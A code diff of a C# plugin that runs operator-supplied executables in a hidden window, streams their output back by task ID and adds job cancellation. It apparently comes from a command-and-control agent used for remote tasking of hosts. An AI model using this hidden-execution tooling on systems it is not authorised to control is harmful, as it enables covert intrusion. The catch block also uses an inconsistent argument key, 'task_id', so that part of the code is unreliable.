@@ -9,10 +9,9 @@ namespace Plugin
 {
     public static class Plugin
     {
-        static ConcurrentDictionary<string, ShellJob> commandTracking = new ConcurrentDictionary<string, ShellJob>();
+        static Dictionary<string, Process> runningProcs = new Dictionary<string, Process>();
         public static void Execute(Dictionary<string, object> args)
         {
-            StringBuilder sb = new StringBuilder();
             try
             {
                 PluginHandler.AddResponse(ShellExec(args));
@@ -23,6 +22,37 @@ namespace Plugin
                 PluginHandler.WriteOutput(e.ToString(), (string)args["task-id"], true, "error");
             }
         }
+
+        public static void Kill(Dictionary<string, object> args)
+        {
+            try
+            {
+                if (runningProcs.ContainsKey((string)args["task-id"]))
+                {
+                    runningProcs[(string)args["task-id"]].Kill();
+                    runningProcs[(string)args["task-id"]].WaitForExit();
+
+                    PluginHandler.AddResponse(new ResponseResult()
+                    {
+                        task_id = (string)args["task-id"],
+                        user_output = "Job Cancelled.",
+                        completed = "true",
+                    });
+                }
+            }
+            catch (Exception e)
+            {
+
+                PluginHandler.AddResponse(new ResponseResult()
+                {
+                    task_id = (string)args["task-id"],
+                    user_output = e.ToString(),
+                    completed = "true",
+                    status = "error",
+                });
+            }
+        }
+
         public static ResponseResult ShellExec(Dictionary<string, object> args)
         {
             string parameters = "";
@@ -33,57 +63,43 @@ namespace Plugin
 
             string executable = (string)args["executable"];
 
-            ShellJob sj = new ShellJob((string)args["task-id"])
+
+            Process process = new Process
             {
-                sb = new StringBuilder(),
-                isRunning = true,
-                process = new Process
+                StartInfo = new ProcessStartInfo()
                 {
-                    StartInfo = new ProcessStartInfo()
-                    {
-                        UseShellExecute = false,
-                        CreateNoWindow = true,
-                        WindowStyle = ProcessWindowStyle.Hidden,
-                        FileName = executable,
-                        Arguments = parameters,
-                        RedirectStandardError = true,
-                        RedirectStandardOutput = true
-                    }
+                    UseShellExecute = false,
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    FileName = executable,
+                    Arguments = parameters,
+                    RedirectStandardError = true,
+                    RedirectStandardOutput = true
                 }
             };
+
             try
             {
-                sj.process.ErrorDataReceived += (sender, errorLine) => { if (errorLine.Data is not null) sj.sb.AppendLine(errorLine.Data); };
-                sj.process.OutputDataReceived += (sender, outputLine) => { if (outputLine.Data is not null) sj.sb.AppendLine(outputLine.Data); };
+                process.ErrorDataReceived += (sender, errorLine) => { if (errorLine.Data is not null) PluginHandler.WriteOutput(errorLine.Data, (string)args["task-id"], false, "error"); };
+                process.OutputDataReceived += (sender, outputLine) => { if (outputLine.Data is not null) PluginHandler.WriteOutput(outputLine.Data, (string)args["task-id"], false); };
 
+                process.Start();
+                process.BeginErrorReadLine();
+                process.BeginOutputReadLine();
 
-                sj.process.Start();
-                sj.process.BeginErrorReadLine();
-                sj.process.BeginOutputReadLine();
-
-                //Add to Tracking
-                commandTracking.GetOrAdd(sj.task_id, sj);
-
-                sj.process.WaitForExit();
-
-                //Remove from tracking
-                commandTracking.Remove(sj.task_id, out _);
-
-                sj.isRunning = false;
+                process.WaitForExit();
 
                 ResponseResult result = new ResponseResult()
                 {
-                    user_output = sj.sb.ToString(),
-                    task_id = sj.task_id,
+                    user_output = Environment.NewLine + "Process Finished.",
+                    task_id = (string)args["task-id"],
                     completed = "true",
                 };
 
-                sj.sb.Clear();
-
-                if (sj.process.ExitCode != 0)
+                if (process.ExitCode != 0)
                 {
                     result.status = "error";
-                    result.user_output += Environment.NewLine + "Process exited with code: " + sj.process.ExitCode;
+                    result.user_output += Environment.NewLine + "Process exited with code: " + process.ExitCode;
                 }
 
                 return result;
@@ -93,49 +109,13 @@ namespace Plugin
                 return new ResponseResult()
                 {
                     //user_output = process.StandardOutput.ReadToEnd() + Environment.NewLine + process.StandardError.ReadToEnd() + Environment.NewLine + e.Message,
-                    user_output = sj.sb.ToString() + Environment.NewLine + e.Message,
-                    task_id = sj.task_id,
+                    user_output = Environment.NewLine + e.ToString(),
+                    task_id = (string)args["task_id"],
                     completed = "true",
                     status = "error"
                 };
             }
         }
-        /// <summary>
-        /// Get current output from executing commands
-        /// </summary>
-        public static List<ResponseResult> GetOutput()
-        {
-            ConcurrentBag<ResponseResult> results = new ConcurrentBag<ResponseResult>();
 
-            Parallel.ForEachAsync(commandTracking, async (job, cancellationToken) =>
-            {
-                if (job.Value.sb.Length > 0)
-                {
-                    results.Add(new ResponseResult()
-                    {
-                        user_output = job.Value.sb.ToString(),
-                        task_id = job.Value.task_id,
-                    });
-
-                    job.Value.sb.Clear();
-                }
-            });
-
-            return results.ToList();
-        }
     }
-    public class ShellJob 
-    {
-        public StringBuilder sb { get; set; }
-        public bool isRunning { get; set; }
-        public Process process { get; set; }
-        public string task_id { get; set; }
-
-
-        public ShellJob(string task_id)
-        {
-            this.task_id = task_id;
-        }
-    }
-
 }
